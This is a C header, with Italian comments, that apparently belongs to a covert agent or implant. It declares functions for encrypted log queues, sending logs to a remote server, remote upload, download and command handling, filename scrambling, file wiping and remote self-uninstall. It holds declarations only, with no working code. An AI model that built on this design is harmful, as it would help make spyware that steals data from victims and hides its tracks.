extern void LOG_InitLog(void);
extern BOOL LOG_InitAgentLog(DWORD);
extern void LOG_StopAgentLog(DWORD);
extern BOOL LOG_ReportLog(DWORD, BYTE *, DWORD);
extern HANDLE Log_CreateFile(DWORD, BYTE *, DWORD);
extern void Log_CloseFile(HANDLE);
extern DWORD LOG_GetActualLogSize(void);
extern BOOL Log_WriteFile(HANDLE , BYTE *, DWORD);
extern BOOL LOG_SendLogQueue(DWORD, DWORD, DWORD);
extern BOOL LOG_StartLogConnection(char *, char *, BOOL *, long long *, DWORD *, DWORD);
extern void LOG_CloseLogConnection(void);
extern void Log_RemoveFiles(void);
extern BOOL LOG_HandleUpload(BOOL);
extern BOOL LOG_HandleDownload(void);
extern BOOL LOG_HandleFileSystem(void);
extern BOOL LOG_HandleCommands(void);
extern char *LOG_ScrambleName(char *, BYTE, BOOL);
extern char *LOG_ScrambleName2(char *, BYTE, BOOL);
extern void Log_Sanitize(char *);
extern void Log_SwitchQueue(void);
extern BOOL Log_CopyFile(WCHAR *, WCHAR *, BOOL, DWORD);
extern BOOL Log_SaveAgentState(DWORD, BYTE *, DWORD);
extern BOOL Log_RestoreAgentState(DWORD, BYTE *, DWORD);
extern void LOG_InitCryptKey(BYTE *, BYTE *);
extern void LOG_InitSequentialLogs();
extern HANDLE Log_CreateOutputFile(char *command_name);
extern BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep);
extern void LOG_Purge(long long f_time, DWORD size);

#define LOG_CONF_NEW_FILE 0  // c'e' un nuovo file
#define LOG_CONF_NOP      1  // non c'e' un nuovo file
#define LOG_CONF_ERROR    2  // errore ASP
#define LOG_CONF_UNINST   3  // comanda al client di disinstallarsi
extern BOOL LOG_ReceiveNewConf(void);

extern BOOL log_wipe_file; // usato per decidere se fare il wiping

// Deve essere pari
#define ALPHABET_LEN 64

typedef struct _FileAdditionalData {
	UINT uVersion;
		#define LOG_FILE_VERSION 2008122901
	UINT uFileNameLen;
} FileAdditionalData, *pFileAdditionalData;
